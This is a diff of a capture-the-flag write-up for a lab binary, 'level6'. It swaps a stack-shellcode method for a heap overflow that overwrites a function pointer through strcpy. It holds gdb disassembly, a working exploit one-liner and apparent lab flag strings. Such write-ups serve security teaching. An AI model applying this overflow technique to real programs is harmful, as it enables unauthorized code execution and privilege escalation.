@@ -2,7 +2,7 @@
 
 level6:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
-main:
+main: uses the strcpy function which is vulnerable to buffer overflows.
 ```
 (gdb) disas main
    0x0804847c <+0>:     push   ebp
@@ -10,10 +10,10 @@ main:
    0x0804847f <+3>:     and    esp,0xfffffff0
    0x08048482 <+6>:     sub    esp,0x20
    0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
-   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
+   0x0804848c <+16>:    call   0x8048350 <malloc@plt> // first allocation/chunk
    0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
    0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
-   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
+   0x0804849c <+32>:    call   0x8048350 <malloc@plt> // second allocation/chunk
    0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
    0x080484a5 <+41>:    mov    edx,0x8048468
    0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
@@ -33,38 +33,33 @@ main:
    0x080484d3 <+87>:    ret
 ```
 
-Finding the offset to overrite `EAX`
+m:
 ```
-(gdb) r $(python -c 'print("A"*72 + "BBBB")')
-...
-Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-```
-
-Finding the address where we will inject our shellcode
-```
-(gdb) b *main + 84
-(gdb) r $(python -c 'print("A"*72 + "BBBB" + "\x90"*128)')
-(gdb) x/200x $esp
-...
-0xbffff840:     0x4100366c      0x41414141      0x41414141      0x41414141
-0xbffff850:     0x41414141      0x41414141      0x41414141      0x41414141
-0xbffff860:     0x41414141      0x41414141      0x41414141      0x41414141
-0xbffff870:     0x41414141      0x41414141      0x41414141      0x41414141
-0xbffff880:     0x41414141      0x41414141      0x42414141      0x90424242
-0xbffff890:     0x90909090      0x90909090      0x90909090      0x90909090
-0xbffff8a0:     0x90909090      0x90909090      0x90909090      0x90909090
-0xbffff8b0:     0x90909090      0x90909090      0x90909090      0x90909090
-...
+(gdb) disas m
+   0x08048468 <+0>:     push   ebp
+   0x08048469 <+1>:     mov    ebp,esp
+   0x0804846b <+3>:     sub    esp,0x18
+   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1
+   0x08048475 <+13>:    call   0x8048360 <puts@plt>
+   0x0804847a <+18>:    leave
+   0x0804847b <+19>:    ret
 ```
 
-We created `shellcode.py` to genrate a payload and passed is as argument to `./level6`.
-
-Once executed, we got a shell as the user `level7`.
+n:
 ```
-$ ./level6 $(python /tmp/shellcode.py)
-$ whoami
-level7
-$ cat /home/user/level7/.pass
+(gdb) disas n
+   0x08048454 <+0>:     push   ebp
+   0x08048455 <+1>:     mov    ebp,esp
+   0x08048457 <+3>:     sub    esp,0x18
+   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0
+   0x08048461 <+13>:    call   0x8048370 <system@plt>
+   0x08048466 <+18>:    leave
+   0x08048467 <+19>:    ret
+```
+
+Since the allocated heap chunks are adjacent we can overwrite the function pointer in the second chunk through the first chunk which we are writing into via strcpy a buffer overflow vunlerable function.
+
+```
+$ ./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
